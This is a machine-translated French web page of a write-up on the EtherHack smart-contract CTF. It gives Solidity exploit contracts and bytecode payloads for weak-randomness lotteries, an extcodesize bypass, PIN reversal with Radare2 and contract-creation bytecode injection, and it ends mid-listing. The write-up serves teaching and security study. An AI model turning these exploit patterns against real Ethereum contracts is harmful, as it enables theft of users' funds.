<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>👦🏾 🗑️ 🤟🏾 Trouver des vulnérabilités dans les contrats intelligents: examen EtherHack lors des jours de piratage positifs 8 👉 🚜 🛃</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Cette année, PHDays a organisé pour la première fois un concours appelé EtherHack . Les participants ont recherché des vulnérabilités dans les contrat...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Trouver des vulnérabilités dans les contrats intelligents: examen EtherHack lors des jours de piratage positifs 8</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/pt/blog/414959/"> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="><img src="https://habrastorage.org/getpro/habr/post_images/182/a00/fef/182a00fef4fbdd4677afb585de886e1e.jpg" alt="image"></a> <br><br>  Cette année, PHDays a organisé pour la première fois un concours appelé <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">EtherHack</a> .  Les participants ont recherché des vulnérabilités dans les contrats intelligents pour la vitesse.  Dans cet article, nous vous expliquerons les tâches du concours et les moyens possibles de les résoudre. <a name="habracut"></a><br><br><h2>  Azino 777 </h2><br><h4>  Gagnez à la loterie et cassez le pot! </h4><br>  Les trois premières tâches étaient liées à des erreurs dans la génération de nombres pseudo-aléatoires, dont nous avons récemment parlé: <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Prédire les nombres aléatoires dans les contrats intelligents Ethereum</a> .  La première tâche était basée sur un générateur de nombres pseudo-aléatoires (PRNG), qui utilisait le hachage du dernier bloc comme source d'entropie pour générer des nombres aléatoires: <br><br><pre><code class="cpp hljs">pragma solidity ^<span class="hljs-number"><span class="hljs-number">0.4</span></span><span class="hljs-number"><span class="hljs-number">.16</span></span>; contract Azino777 { <span class="hljs-function"><span class="hljs-function">function </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">spin</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(uint256 bet)</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> payable </span></span>{ require(msg.value &gt;= <span class="hljs-number"><span class="hljs-number">0.01</span></span> ether); uint256 num = rand(<span class="hljs-number"><span class="hljs-number">100</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(num == bet) { msg.sender.transfer(<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.balance); } } <span class="hljs-comment"><span class="hljs-comment">//Generate random number between 0 &amp; max uint256 constant private FACTOR = 1157920892373161954235709850086879078532699846656405640394575840079131296399; function rand(uint max) constant private returns (uint256 result){ uint256 factor = FACTOR * 100 / max; uint256 lastBlockNumber = block.number - 1; uint256 hashVal = uint256(block.blockhash(lastBlockNumber)); return uint256((uint256(hashVal) / factor)) % max; } function() public payable {} }</span></span></code> </pre> <br>  Étant donné que le résultat de l'appel de la fonction <code>block.blockhash(block.number-1)</code> sera le même pour toute transaction dans le même bloc, l'attaque peut utiliser un contrat d'exploitation avec la même fonction <code>rand()</code> pour appeler le contrat cible via un message interne: <br><br><pre> <code class="cpp hljs"><span class="hljs-function"><span class="hljs-function">function </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">WeakRandomAttack</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(address _target)</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> payable </span></span>{ target = Azino777(_target); } <span class="hljs-function"><span class="hljs-function">function </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">attack</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> </span></span>{ uint256 num = rand(<span class="hljs-number"><span class="hljs-number">100</span></span>); target.spin.value(<span class="hljs-number"><span class="hljs-number">0.01</span></span> ether)(num); }</code> </pre> <br><h2>  Privé Ryan </h2><br><h4>  Nous avons ajouté une valeur initiale privée que personne ne calculera jamais. </h4><br>  Cette tâche est une version légèrement compliquée de la précédente.  La variable de départ, qui est considérée comme privée, est utilisée pour compenser le nombre ordinal de bloc (block.number) afin que le hachage du bloc ne dépende pas du bloc précédent.  Après chaque pari, la graine est réécrite dans un nouveau décalage «aléatoire».  Par exemple, dans la loterie <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Slotthereum,</a> c'était juste ça. <br><br><pre> <code class="cpp hljs">contract PrivateRyan { uint <span class="hljs-keyword"><span class="hljs-keyword">private</span></span> seed = <span class="hljs-number"><span class="hljs-number">1</span></span>; <span class="hljs-function"><span class="hljs-function">function </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">PrivateRyan</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span></span>{ seed = rand(<span class="hljs-number"><span class="hljs-number">256</span></span>); } <span class="hljs-function"><span class="hljs-function">function </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">spin</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(uint256 bet)</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> payable </span></span>{ require(msg.value &gt;= <span class="hljs-number"><span class="hljs-number">0.01</span></span> ether); uint256 num = rand(<span class="hljs-number"><span class="hljs-number">100</span></span>); seed = rand(<span class="hljs-number"><span class="hljs-number">256</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(num == bet) { msg.sender.transfer(<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.balance); } } <span class="hljs-comment"><span class="hljs-comment">/* ... */</span></span> }</code> </pre> <br>  Comme dans la tâche précédente, le pirate n'avait besoin que de copier la fonction <code>rand()</code> dans l'exploit contractuel, mais dans ce cas, la valeur de la variable privée seed devait être obtenue en dehors de la blockchain, puis envoyée à l'exploit comme argument.  Pour ce faire, vous pouvez utiliser la méthode <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">web3.eth.getStorageAt ()</a> de la bibliothèque web3: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/f54/73b/748/f5473b74840e81cc2bef6c3105401777.png" alt="image"><br><br>  <i>Lire le magasin de contrats en dehors de la blockchain pour obtenir la valeur initiale</i> <br><br>  Après avoir reçu la valeur initiale, il ne reste plus qu'à l'envoyer à l'exploit, qui est presque identique à celui de la première tâche: <br><br><pre> <code class="cpp hljs">contract PrivateRyanAttack { PrivateRyan target; uint <span class="hljs-keyword"><span class="hljs-keyword">private</span></span> seed; <span class="hljs-function"><span class="hljs-function">function </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">PrivateRyanAttack</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(address _target, uint _seed)</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> payable </span></span>{ target = PrivateRyan(_target); seed = _seed; } <span class="hljs-function"><span class="hljs-function">function </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">attack</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> </span></span>{ uint256 num = rand(<span class="hljs-number"><span class="hljs-number">100</span></span>); target.spin.value(<span class="hljs-number"><span class="hljs-number">0.01</span></span> ether)(num); } <span class="hljs-comment"><span class="hljs-comment">/* ... */</span></span> }</code> </pre> <br><h2>  Roue de la fortune </h2><br><h4>  Cette loterie utilise le hachage du bloc suivant.  Essayez de le calculer! </h4><br>  Dans cette tâche, il était nécessaire de découvrir le hachage du bloc dont le numéro était stocké dans la structure du jeu après le pari.  Ce hachage a ensuite été extrait pour générer un nombre aléatoire après le prochain pari. <br><br><pre> <code class="cpp hljs">Pragma solidity ^<span class="hljs-number"><span class="hljs-number">0.4</span></span><span class="hljs-number"><span class="hljs-number">.16</span></span>; contract WheelOfFortune { Game[] <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> games; <span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">struct</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">Game</span></span></span><span class="hljs-class"> {</span></span> address player; uint id; uint bet; uint blockNumber; } <span class="hljs-function"><span class="hljs-function">function </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">spin</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(uint256 _bet)</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> payable </span></span>{ require(msg.value &gt;= <span class="hljs-number"><span class="hljs-number">0.01</span></span> ether); uint gameId = games.length; games.length++; games[gameId].id = gameId; games[gameId].player = msg.sender; games[gameId].bet = _bet; games[gameId].blockNumber = block.number; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (gameId &gt; <span class="hljs-number"><span class="hljs-number">0</span></span>) { uint lastGameId = gameId - <span class="hljs-number"><span class="hljs-number">1</span></span>; uint num = rand(block.blockhash(games[lastGameId].blockNumber), <span class="hljs-number"><span class="hljs-number">100</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(num == games[lastGameId].bet) { games[lastGameId].player.transfer(<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.balance); } } } <span class="hljs-function"><span class="hljs-function">function </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">rand</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(bytes32 hash, uint max)</span></span></span><span class="hljs-function"> pure </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">private</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">returns</span></span></span><span class="hljs-function"> </span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(uint256 result)</span></span></span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> uint256(keccak256(hash)) % max; } function() <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> payable {} }</code> </pre><br>  Dans ce cas, il existe deux solutions possibles. <br><br><ol><li>  Appelez le contrat cible deux fois via le contrat d'exploitation.  Le résultat de l'appel de la fonction block.blockhash (block.number) sera toujours nul. </li><li>  Attendez que 256 blocs se glissent et faites un deuxième pari.  Le hachage de numéro de séquence de bloc stocké sera nul en raison des <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">limitations d'Ethereum Virtual Machine (EVM)</a> sur le nombre de hachages de bloc disponibles. </li></ol><br>  Dans les deux cas, le pari gagnant sera <code>uint256(keccak256(bytes32(0))) % 100</code> ou «47». <br><br><h2>  Appelez-moi peut-être </h2><br><h4>  Ce contrat n'aime pas quand d'autres contrats l'appellent. </h4><br>  Une façon de protéger un contrat d'être appelé par d'autres contrats consiste à utiliser l'instruction d'assemblage EVM <code>extcodesize</code> , qui renvoie la taille du contrat à son adresse.  La méthode consiste à utiliser cette instruction pour l'adresse de l'expéditeur de la transaction à l'aide de l'insertion d'assembleur.  Si le résultat est supérieur à zéro, l'expéditeur de la transaction est un contrat, car les adresses ordinaires dans Ethereum n'ont pas de code.  C'est précisément cette approche qui a été utilisée dans cette tâche pour empêcher d'autres contrats d'appeler le contrat. <br><br><pre> <code class="cpp hljs">contract CallMeMaybe { <span class="hljs-function"><span class="hljs-function">modifier </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">CallMeMaybe</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span></span>{ uint32 size; address _addr = msg.sender; assembly { size := extcodesize(_addr) } <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (size &gt; <span class="hljs-number"><span class="hljs-number">0</span></span>) { revert(); } _; } <span class="hljs-function"><span class="hljs-function">function </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">HereIsMyNumber</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> CallMeMaybe </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(tx.origin == msg.sender) { revert(); } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> { msg.sender.transfer(<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.balance); } } function() payable {} }</code> </pre> <br>  La <code>tx.origin</code> transaction <code>tx.origin</code> pointe vers le créateur d'origine de la transaction et msg.sender vers le dernier appelant.  Si nous envoyons la transaction à partir de l'adresse habituelle, ces variables seront égales et nous nous retrouverons avec <code>revert()</code> .  Par conséquent, pour résoudre notre problème, il était nécessaire de contourner la vérification de l'instruction <code>extcodesize</code> afin que <code>tx.origin</code> et <code>msg.sender</code> différents.  Heureusement, il existe une fonctionnalité intéressante dans EVM qui peut vous aider: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/9e9/07a/74e/9e907a74eb156cb8380527b50d47a4b8.png" alt="image"><br><br>  En effet, lorsque le contrat qui vient d'être placé appelle un autre contrat chez le constructeur, il n'existe pas encore lui-même dans la blockchain, il agit exclusivement comme un portefeuille.  Ainsi, le code n'est pas lié au nouveau contrat et extcodesize renverra zéro: <br><br><pre> <code class="cpp hljs"> contract CallMeMaybeAttack { <span class="hljs-function"><span class="hljs-function">function </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">CallMeMaybeAttack</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(CallMeMaybe _target)</span></span></span><span class="hljs-function"> payable </span></span>{ _target.HereIsMyNumber(); } function() payable {} }</code> </pre> <br><h2>  La serrure </h2><br><h4>  Curieusement, le château est fermé.  Essayez de récupérer le code PIN via la fonction de déverrouillage (code PIN octets4).  Chaque tentative de déverrouillage vous coûtera 0,5 éther. </h4><br>  Dans cette tâche, les participants n'ont pas reçu de code - ils ont dû restaurer la logique du contrat par son bytecode.  Une option était d'utiliser Radare2, une plate-forme utilisée pour <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">démonter</a> et <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">déboguer les EVM</a> . <br><br>  Pour commencer, nous publierons un exemple de la tâche et entrerons le code au hasard: <br><br><pre> <code class="cpp hljs">await contract.unlock(<span class="hljs-string"><span class="hljs-string">"1337"</span></span>, {value: <span class="hljs-number"><span class="hljs-number">500000000000000000</span></span>}) →<span class="hljs-literal"><span class="hljs-literal">false</span></span></code> </pre> <br>  La tentative, bien sûr, est bonne, mais infructueuse.  Essayez maintenant de déboguer cette transaction. <br><br><pre> <code class="cpp hljs">r2 -a evm -D evm <span class="hljs-string"><span class="hljs-string">"evm://localhost:8545@0xf7dd5ca9d18091d17950b5ecad5997eacae0a7b9cff45fba46c4d302cf6c17b7"</span></span></code> </pre> <br>  Dans ce cas, nous demandons à Radare2 d'utiliser l'architecture evm.  Cet outil se connecte ensuite au nœud Ethereum et récupère la trace de cette transaction dans la machine virtuelle.  Et maintenant, enfin, nous sommes prêts à plonger dans le bytecode EVM. <br><br>  Tout d'abord, vous devez effectuer une analyse: <br><br><pre> <code class="cpp hljs">[<span class="hljs-number"><span class="hljs-number">0x00000000</span></span>]&gt; aa [x] Analyze all flags starting with sym. <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">and</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">entry0</span></span></span><span class="hljs-function"> </span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(aa)</span></span></span></span></code> </pre> <br>  Ensuite, nous démontons les 1000 premières instructions (cela devrait suffire pour couvrir l'intégralité du contrat) à l'aide de la commande pd 1000 et passons à l'affichage du graphique avec la commande VV. <br><br>  Dans le code d'octets EVM compilé avec <code>solc</code> , le gestionnaire de fonctions vient généralement en premier.  Sur la base des quatre premiers octets des données d'appel contenant la signature de fonction, qui est définie comme <code>bytes4(sha3(function_name(params)))</code> , le gestionnaire de fonction décide quelle fonction appeler.  Nous nous intéressons à la fonction de <code>unlock(bytes4)</code> , qui correspond à <code>0x75a4e3a0</code> . <br><br>  Après le flux d'exécution à l'aide de la clé s, nous arrivons au nœud qui compare l' <code>callvalue</code> avec la valeur <code>0x6f05b59d3b20000</code> ou <code>500000000000000000</code> , ce qui équivaut à 0,5 éther: <br><br><pre> <code class="cpp hljs">push8 <span class="hljs-number"><span class="hljs-number">0x6f05b59d3b20000</span></span> callvalue lt</code> </pre> <br>  Si l'éther fourni est suffisant, alors on se retrouve dans un nœud qui ressemble à une structure de contrôle: <br><br><pre> <code class="cpp hljs">push1 <span class="hljs-number"><span class="hljs-number">0x4</span></span> dup4 push1 <span class="hljs-number"><span class="hljs-number">0xff</span></span> <span class="hljs-keyword"><span class="hljs-keyword">and</span></span> lt iszero push2 <span class="hljs-number"><span class="hljs-number">0x1a4</span></span> jumpi</code> </pre> <br>  Le code place la valeur 0x4 en haut de la pile, vérifie la limite supérieure (la valeur ne doit pas dépasser 0xff) et compare lt avec une valeur qui a été dupliquée à partir du quatrième élément de la pile (dup4). <br><br>  En défilant tout en bas du graphique, nous voyons que ce quatrième élément est essentiellement un itérateur, et cette structure de contrôle est une boucle qui correspond à <code>for(var i=0; i&lt;4; i++):</code> <br><br><pre> <code class="cpp hljs">push1 <span class="hljs-number"><span class="hljs-number">0x1</span></span> add swap4</code> </pre> <br>  Si nous considérons le corps de la boucle, il devient évident qu'il énumère quatre octets entrants et effectue certaines opérations avec chacun des octets.  Tout d'abord, la boucle vérifie que le nième octet est supérieur à 0x30: <br><br><pre> <code class="cpp hljs">push1 <span class="hljs-number"><span class="hljs-number">0x30</span></span> dup3 lt iszero</code> </pre> <br>  et aussi que cette valeur est inférieure à 0x39: <br><br><pre> <code class="cpp hljs">push1 <span class="hljs-number"><span class="hljs-number">0x39</span></span> dup3 gt iszero</code> </pre> <br>  qui est essentiellement une vérification que l'octet donné est dans la plage de 0 à 9. Si la vérification réussit, nous nous retrouvons dans le bloc de code le plus important: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/085/2d4/27b/0852d427bd50ab1d0da2fed5131dfac2.png" alt="image"><br><br>  Décomposons ce bloc en plusieurs parties: <br><br>  1. Le troisième élément de la pile est le code ASCII du nième octet du code PIN.  0x30 (code ASCII pour zéro) est poussé sur la pile puis soustrait du code de cet octet: <br><br><pre> <code class="cpp hljs">push1 <span class="hljs-number"><span class="hljs-number">0x30</span></span> dup3 sub</code> </pre> <br>  Autrement dit, le <code>pincode[i] - 48</code> , et nous obtenons essentiellement un chiffre du code ASCII, appelons-le d. <br><br>  2. 0x4 est ajouté à la pile et utilisé comme exposant pour le deuxième élément de la pile, d: <br><br><pre> <code class="cpp hljs">swap1 pop push1 <span class="hljs-number"><span class="hljs-number">0x4</span></span> dup2 <span class="hljs-built_in"><span class="hljs-built_in">exp</span></span></code> </pre> <br>  Autrement dit, <code>d ** 4</code> . <br><br>  3. Le cinquième élément de la pile est récupéré et le résultat de l'exponentiation y est ajouté.  Appelons cette somme S: <br><br><pre> <code class="cpp hljs">dup5 add swap4 pop dup1</code> </pre> <br>  Autrement dit, <code>S += d ** 4</code> . <br><br>  4. 0xa (code ASCII pour 10) est poussé sur la pile et utilisé comme multiplicateur pour le septième élément de la pile (qui était le sixième avant cet ajout).  Nous ne savons pas ce que c'est, donc nous appellerons cet élément U. Ensuite, d est ajouté au résultat de la multiplication: <br><br><pre> <code class="cpp hljs">push1 <span class="hljs-number"><span class="hljs-number">0xa</span></span> dup7 mul add swap5 pop</code> </pre> <br>  C'est-à-dire: <code>U = U * 10 + d</code> ou, plus simplement, cette expression récupère le code PIN entier sous forme de nombre à partir d'octets individuels <code>([0x1, 0x3, 0x3, 0x7] → 1337)</code> . <br><br>  La chose la plus difficile que nous ayons faite, passons maintenant au code après la boucle. <br><br><pre> <code class="cpp hljs">dup5 dup5 eq</code> </pre> <br>  Si les cinquième et sixième éléments de la pile sont égaux, le flux d'exécution nous mènera à l'instruction sstore, qui définit un certain indicateur dans le magasin de contrats.  Puisque c'est la seule instruction sstore, c'est apparemment ce que nous recherchions. <br><br>  Mais comment passer ce test?  Comme nous l'avons déjà découvert, le cinquième élément de la pile est S et le sixième est U. Puisque S est la somme de tous les chiffres du code PIN élevé à la quatrième puissance, nous avons besoin d'un code PIN pour lequel cette condition sera remplie.  Dans notre cas, l'analyse a montré que <code>1**4 + 3**4 + 3**4 + 7**4</code> n'est pas égal à 1337, et nous ne sommes pas <code>sstore</code> instruction gagnante <code>sstore</code> . <br><br>  Mais maintenant, nous pouvons calculer un nombre qui satisfait aux conditions de cette équation.  Il n'y a que trois nombres qui peuvent être écrits comme la somme de leurs chiffres du quatrième degré: 1634, 8208 et 9474. Chacun d'entre eux peut ouvrir la serrure! <br><br><h2>  Bateau pirate </h2><br><h4>  Salut Salag!  Un bateau pirate amarré au port.  Faites-lui jeter l'ancre et soulevez le drapeau avec Jolly Roger et partez à la recherche de trésors. </h4><br>  Le cours standard d'exécution du contrat comprend trois actions: <br><br><ol><li>  Un appel à la fonction <code>dropAnchor()</code> avec un numéro de bloc qui doit être plus de 100 000 blocs plus grand que le bloc actuel.  La fonction crée dynamiquement un contrat, qui est une "ancre", qui peut être "levée" en utilisant <code>selfdestruct()</code> après le bloc spécifié. </li><li>  Un appel à la fonction <code>pullAnchor()</code> , qui lance <code>selfdestruct()</code> si suffisamment de temps s'est écoulé (beaucoup de temps!). </li><li>  Appelez sailAway (), qui définit <code>blackJackIsHauled</code> sur true s'il n'existe aucun contrat d'ancrage. </li></ol><br><pre> <code class="cpp hljs">pragma solidity ^<span class="hljs-number"><span class="hljs-number">0.4</span></span><span class="hljs-number"><span class="hljs-number">.19</span></span>; contract PirateShip { address <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> anchor = <span class="hljs-number"><span class="hljs-number">0x0</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">bool</span></span> <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> blackJackIsHauled = <span class="hljs-literal"><span class="hljs-literal">false</span></span>; <span class="hljs-function"><span class="hljs-function">function </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">sailAway</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> </span></span>{ require(anchor != <span class="hljs-number"><span class="hljs-number">0x0</span></span>); address a = anchor; uint size = <span class="hljs-number"><span class="hljs-number">0</span></span>; assembly { size := extcodesize(a) } <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(size &gt; <span class="hljs-number"><span class="hljs-number">0</span></span>) { revert(); <span class="hljs-comment"><span class="hljs-comment">// it is too early to sail away } blackJackIsHauled = true; // Yo Ho Ho! } function pullAnchor() public { require(anchor != 0x0); require(anchor.call()); // raise the anchor if the ship is ready to sail away } function dropAnchor(uint blockNumber) public returns(address addr) { // the ship will be able to sail away in 100k blocks time require(blockNumber &gt; block.number + 100000); // if(block.number &lt; blockNumber) { throw; } // suicide(msg.sender); uint[8] memory a; a[0] = 0x6300; // PUSH4 0x00... a[1] = blockNumber; // ...block number (3 bytes) a[2] = 0x43; // NUMBER a[3] = 0x10; // LT a[4] = 0x58; // PC a[5] = 0x57; // JUMPI a[6] = 0x33; // CALLER a[7] = 0xff; // SELFDESTRUCT uint code = assemble(a); // init code to deploy contract: stores it in memory and returns appropriate offsets uint[8] memory b; b[0] = 0; // allign b[1] = 0x6a; // PUSH11 b[2] = code; // contract b[3] = 0x6000; // PUSH1 0 b[4] = 0x52; // MSTORE b[5] = 0x600b; // PUSH1 11 ;; length b[6] = 0x6015; // PUSH1 21 ;; offset b[7] = 0xf3; // RETURN uint initcode = assemble(b); uint sz = getSize(initcode); uint offset = 32 - sz; assembly { let solidity_free_mem_ptr := mload(0x40) mstore(solidity_free_mem_ptr, initcode) addr := create(0, add(solidity_free_mem_ptr, offset), sz) } require(addr != 0x0); anchor = addr; } ///////////////// HELPERS ///////////////// function assemble(uint[8] chunks) internal pure returns(uint code) { for(uint i=chunks.length; i&gt;0; i--) { code ^= chunks[i-1] &lt;&lt; 8 * getSize(code); } } function getSize(uint256 chunk) internal pure returns(uint) { bytes memory b = new bytes(32); assembly { mstore(add(b, 32), chunk) } for(uint32 i = 0; i&lt; b.length; i++) { if(b[i] != 0) { return 32 - i; } } return 0; } }</span></span></code> </pre> <br>  La vulnérabilité est assez évidente: nous avons une injection directe d'instructions d'assembleur lors de la création d'un contrat dans la fonction <code>dropAnchor()</code> .  Mais la principale difficulté était de créer une charge utile qui nous permettrait de passer le <code>block.number</code> . <br><br>  Dans EVM, vous pouvez créer des contrats à l'aide de l'instruction create.  Ses arguments sont la valeur, le décalage d'entrée et la taille d'entrée.  value est un bytecode qui héberge le contrat lui-même (code d'initialisation).  Dans notre cas, le code d'initialisation + le code de contrat est placé dans uint256 (merci à l'équipe <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">GasToken</a> pour l'idée): <br><br><pre> <code class="cpp hljs"><span class="hljs-number"><span class="hljs-number">0x6a63004141414310585733ff600052600b6015f3</span></span></code> </pre> <br>  où les octets en gras sont le code du contrat hébergé et 414141 est le site d'injection.  Puisque nous sommes confrontés à la tâche de nous débarrasser de l'opérateur de projection, nous devons insérer notre nouveau contrat et réécrire la partie finale du code d'initialisation.  Essayons d'injecter le contrat avec l'instruction 0xff, ce qui entraînera la suppression inconditionnelle du contrat d'ancrage à l'aide de <code>selfdestruct()</code> : <br><br><pre>  68 414141ff3f3f3f3f3f ;;  contrat push9
 60 00 ;;  push1 0
 52 ;;  mstore
 60 09 ;;  push1 9
 60 17 ;;  push1 17
 f3 ;;  retour </pre><br>  Si nous convertissons cette séquence d'octets en <code>uint256 (9081882833248973872855737642440582850680819)</code> et l'utilisons comme argument de la fonction <code>dropAnchor()</code> , nous obtenons la valeur suivante pour la variable de code (le bytecode en gras est notre charge utile): <br><br><pre> <code class="cpp hljs"><span class="hljs-number"><span class="hljs-number">0x630068414141ff3f3f3f3f3f60005260096017f34310585733ff</span></span></code> </pre> <br>  Une fois que la variable de code fait partie de la variable initcode, nous obtenons la valeur suivante: <br><br><pre> <code class="cpp hljs"><span class="hljs-number"><span class="hljs-number">0x68414141ff3f3f3f3f3f60005260096017f34310585733ff600052600b6015f3</span></span></code> </pre> <br>  Maintenant, les octets élevés <code>0x6300</code> disparu et le reste du bytecode est supprimé après <code>0xf3 (return)</code> . <br><br><img src="https://habrastorage.org/getpro/habr/post_images/433/f75/735/433f757356003d73286fa4709cdedcfd.png" alt="image"><br><br>  En conséquence, un nouveau contrat avec la logique modifiée est créé: <br><br><pre>  41 ;;  coinbase
 41 ;;  coinbase
 41 ;;  coinbase
 ff ;;  auto-destruction
 3f ;;  ordure
 3f ;;  ordure
 3f ;;  ordure
 3f ;;  ordure
